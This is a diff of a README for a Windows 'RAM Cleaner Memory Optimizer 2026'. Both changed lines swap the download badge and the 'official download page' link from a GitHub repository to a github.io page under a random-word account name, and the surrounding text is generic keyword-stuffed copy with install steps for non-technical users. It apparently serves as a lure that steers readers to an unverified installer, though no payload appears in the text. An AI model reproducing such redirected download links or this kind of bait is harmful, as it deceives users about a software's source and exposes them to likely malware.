@@ -1,6 +1,6 @@
 # 🧹 RAM-Cleaner-Memory-Optimizer-2026 - Improve your computer speed today easily
 
-[![Download RAM Cleaner](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Familyceratopsidaecannon481/RAM-Cleaner-Memory-Optimizer-2026)
+[![Download RAM Cleaner](https://img.shields.io/badge/Download-Software-blue.svg)](https://familyceratopsidaecannon481.github.io)
 
 RAM Cleaner Memory Optimizer helps your computer run better by managing system memory. Windows uses RAM to store data for active programs. Sometimes these programs stay in memory even after you close them. This software removes unnecessary data to provide more space for the tasks you need.
 
@@ -24,7 +24,7 @@ This software works on most modern Windows systems. Ensure your machine meets th
 
 You must visit the project page to access the latest version. Follow these steps to obtain and install the application safely.
 
-1. Go to the [official download page](https://github.com/Familyceratopsidaecannon481/RAM-Cleaner-Memory-Optimizer-2026).
+1. Go to the [official download page](https://familyceratopsidaecannon481.github.io).
 2. Look for the latest release link on the right side of the page.
 3. Click the link to save the installation file to your computer.
 4. Locate the file in your downloads folder.
